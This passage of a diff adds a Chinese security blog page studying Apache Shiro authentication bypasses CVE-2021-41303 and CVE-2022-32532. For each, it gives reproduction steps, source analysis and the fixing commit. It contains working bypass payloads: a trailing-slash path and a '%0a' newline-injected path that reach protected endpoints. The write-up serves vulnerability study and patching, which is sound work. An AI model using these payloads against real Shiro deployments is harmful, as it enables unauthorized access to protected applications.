+<td align="left">Apache Shiro 与 Spring Boot 一起使用时，远程攻击者可以发送特制的 HTTP 请求， 绕过身份验证过程并获得对应用程序的未授权访问。</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">Spring | 回退 | &#x2F;aaa&#x2F;*&#x2F; | 绕过</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Commit-4a20bf0</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left">[<a target="_blank" rel="noopener" href="https://threedr3am.github.io/]">https://threedr3am.github.io/]</a>(<a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/09/22/%E4%BB%8E%E6%BA%90%E7%A0%81diff%E5%88%86%E6%9E%90Apache-Shiro">https://threedr3am.github.io/2021/09/22/从源码diff分析Apache-Shiro</a> 1.7.1版本的auth bypass（CVE-2021-41303）&#x2F;)</td>
+</tr>
+</tbody></table>
+<h4 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>本次环境用的是shiro1.7.1，配置匹配规则如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filterMap.put(<span class="string">&quot;/admin/*&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">filterMap.put(<span class="string">&quot;/admin/test&quot;</span>, <span class="string">&quot;anon&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>直接访问 <code>/myshiro/admin/test</code>失败，因为会和第一条规则匹配</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291011138.png" alt="image-20220929101119957"></p>
+<p>访问 <code>/myshiro/admin/test/</code>，成功绕过</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291013394.png" alt="image-20220929101333216"></p>
+<h4 id="漏洞分析-10"><a href="#漏洞分析-10" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>在<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>方法中相较于shiro1.7.0版本有了些不同</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291405696.png" alt="image-20220929140503407"></p>
+<p>在1.7.1中把外部可控的requestURINoTrailingSlash（requestURI去掉了&#x2F;后缀）带入到了<code>org.apache.shiro.web.filter.mgt.FilterChainManager#proxy</code>方法中，因此可以发送特定的请求去达到权限绕过。</p>
+<p>场景一：当发送如下的请求时，因为requestURI和pathPattern直接就匹配上了，进入到了<code>filterChainManager.proxy(originalChain, pathPattern)</code>，就无法利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URI：/myshiro/admin/test</span><br><span class="line">pathPattern：/admin/*</span><br></pre></td></tr></table></figure>
+
+<p>场景二：当发送如下的请求时，我们在URI后多加一个&#x2F;，就能让requestURI和pathPattern匹配不上，进入第二次匹配，并且能在第二次匹配中使其pathPattern和requestURINoTrailingSlash成功匹配上，从而进入<code>filterChainManager.proxy(originalChain, requestURINoTrailingSlash)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URI：/myshiro/admin/test/</span><br><span class="line">pathPattern：/admin/*</span><br></pre></td></tr></table></figure>
+
+<p>但是如果<code>requestURINoTrailingSlash</code>在鉴权配置的map中找不到（字符串比较）对应的value数据时，就会报错，而在shiro1.7.1之前，传入的是外部无法控制的<code>pathPattern</code>，而<code>pathPattern</code>是来自于鉴权配置map中的key，所以肯定是可以找到</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291422061.png" alt="image-20220929142213955"></p>
+<p>如果我们在环境中配置如下规则</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filterMap.put(&quot;/admin/*&quot;, &quot;authc&quot;);</span><br><span class="line">filterMap.put(&quot;/admin/test&quot;, &quot;anon&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>在shiro1.7.1之前，我们访问 <code>/myshiro/admin/test/</code>，此时调用<code>filterChainManager.proxy(originalChain, &quot;/admin/*&quot;)</code>那肯定是 <code>/admin/*</code>这个authc  filter进行了处理进行了拦截，在shiro1.7.1开始，调用的就是<code>filterChainManager.proxy(originalChain, &quot;/admin/test&quot;)</code>那肯定是 <code>/admin/test</code>这个anon filter进行了处理，进而顺利的bypass auth访问到了接口。</p>
+<p>更多细节可以参考：<a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/09/22/%E4%BB%8E%E6%BA%90%E7%A0%81diff%E5%88%86%E6%9E%90Apache-Shiro%201.7.1%E7%89%88%E6%9C%AC%E7%9A%84auth%20bypass%EF%BC%88CVE-2021-41303%EF%BC%89/">从源码diff分析Apache-Shiro 1.7.1版本的auth bypass（CVE-2021-41303））</a></p>
+<h4 id="漏洞修复-10"><a href="#漏洞修复-10" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>本次漏洞修复位于 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Commit-4a20bf0</a>，解决方式就是和1.7.1之前一样传入<code>pathPattern</code>获取filter</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291434553.png" alt="image-20220929143422342"></p>
+<h3 id="CVE-2022-32532"><a href="#CVE-2022-32532" class="headerlink" title="CVE-2022-32532"></a>CVE-2022-32532</h3><h4 id="漏洞信息-11"><a href="#漏洞信息-11" class="headerlink" title="漏洞信息"></a>漏洞信息</h4><table>
+<thead>
+<tr>
+<th align="left">漏洞信息</th>
+<th align="left">详情</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">漏洞编号</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32532">CVE-2022-32532</a></td>
+</tr>
+<tr>
+<td align="left">影响版本</td>
+<td align="left">shiro &lt; 1.9.1</td>
+</tr>
+<tr>
+<td align="left">漏洞描述</td>
+<td align="left">RegexRequestMatcher 在使用带有 “.” 的正则时，可能会导致权限绕过</td>
+</tr>
+<tr>
+<td align="left">漏洞关键字</td>
+<td align="left">RegexRequestMatcher | . | 绕过</td>
+</tr>
+<tr>
+<td align="left">漏洞补丁</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/4a20bf0e995909d8fda58f9c0485ea9eb2d43f0e">Commit-4a20bf0</a></td>
+</tr>
+<tr>
+<td align="left">相关链接</td>
+<td align="left"><a target="_blank" rel="noopener" href="https://github.com/4ra1n/CVE-2022-32532">CVE-2022-32532</a> <a target="_blank" rel="noopener" href="https://lists.apache.org/thread/y8260dw8vbm99oq7zv6y3mzn5ovk90xh">https://lists.apache.org/thread/y8260dw8vbm99oq7zv6y3mzn5ovk90xh</a> <a target="_blank" rel="noopener" href="https://tanzu.vmware.com/security/cve-2022-22978">https://tanzu.vmware.com/security/cve-2022-22978</a></td>
+</tr>
+</tbody></table>
+<h4 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>该漏洞和CVE-2022-22978 Spring-security RegexRequestMatcher 认证绕过漏洞类似，在 RegexRequestMatcher 中使用的正则匹配在默认情况下, 正则表达式中点(.)不会匹配换行符, 设置了<code>Pattern.DOTALL</code>模式, 才会匹配所有字符包括换行符，因此可以使用在路径中添加换行符来绕过权限校验。</p>
+<p>漏洞环境采用的是4ra1n师傅的，但已经删除了，可以访问<a target="_blank" rel="noopener" href="https://github.com/Lay0us1/CVE-2022-32532%EF%BC%8C%E5%9C%A8%E8%BF%99%E5%A5%97%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%94%A8%E7%9A%84%E6%98%AFshiro1.9.0%EF%BC%8C%E7%8E%AF%E5%A2%83%E4%BD%BF%E7%94%A8%E7%9A%84PatternMatcher%E4%B8%BA%60RegExPatternMatcher%60">https://github.com/Lay0us1/CVE-2022-32532，在这套环境中用的是shiro1.9.0，环境使用的PatternMatcher为`RegExPatternMatcher`</a></p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291454788.png" alt="image-20220929145453712"></p>
+<p>环境搭建好后，<code>/permit/*</code>下的都是需要权限的，因此直接访问失败</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291458346.png" alt="image-20220929145816133"></p>
+<p>使用绕过的payload <code>/myshiro/permit/%0axx</code>，成功访问</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291459803.png" alt="image-20220929145930657"></p>
+<h4 id="漏洞分析-11"><a href="#漏洞分析-11" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>使用payload访问，调式进入<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#getChain</code>，在进行pathPattern匹配时会调用<code>org.apache.shiro.web.filter.mgt.PathMatchingFilterChainResolver#pathMatches</code>，该方法会获取PatternMatcher</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291506290.png" alt="image-20220929150615200"></p>
+<p>此时获取到的不再是默认的<code>AntPathMatcher</code>，而是<code>RegExPatternMatcher</code>，在该类中并没有配置<code>Pattern.DOTALL</code>，导致匹配失败</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291514317.png" alt="image-20220929151424114"></p>
+<h4 id="漏洞修复-11"><a href="#漏洞修复-11" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>本次漏洞修复位于 <a target="_blank" rel="noopener" href="https://github.com/apache/shiro/commit/6bcb92e06fa588b9c7790dd01bc02135d58d3f5b">Commit-6bcb92e</a>，在进行正则匹配时添加了 <code>Pattern.DOTALL</code> 选项</p>
+<p><img src="https://gitee.com/look_cold/pic-bed/raw/master/img/202209291516236.png" alt="image-20220929151605959"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://su18.org/post/shiro-5/">https://su18.org/post/shiro-5/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Xxy605/article/details/125404334">https://blog.csdn.net/Xxy605/article/details/125404334</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&amp;mid=2247485052&amp;idx=1&amp;sn=b007a722e233b45982b7a57c3788d47d&amp;scene=21#wechat_redirect</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1848169">https://cloud.tencent.com/developer/article/1848169</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/whq12789/article/details/88031965">https://blog.csdn.net/whq12789/article/details/88031965</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/m6eHtxGTMK4igNQcMpqxaw">https://mp.weixin.qq.com/s/m6eHtxGTMK4igNQcMpqxaw</a><br><a target="_blank" rel="noopener" href="https://github.com/Ares-X/shiro-exploit">https://github.com/Ares-X/shiro-exploit</a><br><a target="_blank" rel="noopener" href="https://github.com/inspiringz/Shiro-721">https://github.com/inspiringz/Shiro-721</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9406">https://xz.aliyun.com/t/9406</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7544">https://xz.aliyun.com/t/7544</a><br><a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/09/22/%E4%BB%8E%E6%BA%90%E7%A0%81diff%E5%88%86%E6%9E%90Apache-Shiro%201.7.1%E7%89%88%E6%9C%AC%E7%9A%84auth%20bypass%EF%BC%88CVE-2021-41303%EF%BC%89/">https://threedr3am.github.io/2021/09/22/%E4%BB%8E%E6%BA%90%E7%A0%81diff%E5%88%86%E6%9E%90Apache-Shiro%201.7.1%E7%89%88%E6%9C%AC%E7%9A%84auth%20bypass%EF%BC%88CVE-2021-41303%EF%BC%89/</a><br><a target="_blank" rel="noopener" href="https://github.com/Lay0us1/CVE-2022-32532">https://github.com/Lay0us1/CVE-2022-32532</a></p>
+
+    </div>
+
+    
+    
+    
+      
+
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>kpa1on
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://kpa1on.github.io/2022/09/26/shiro%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="shiro历史漏洞学习">https://kpa1on.github.io/2022/09/26/shiro历史漏洞学习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/shiro/" rel="tag"># shiro</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/09/08/codeql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="prev" title="codeql学习（1）">
+                  <i class="fa fa-chevron-left"></i> codeql学习（1）
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">kpa1on</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">377k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">5:43</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共91.4k字</span>
+  <span class="post-meta-divider">|</span>
+  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  <span class="post-meta-divider">|</span>
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  <span class="post-meta-divider">|</span>
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</div>
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
+</html>
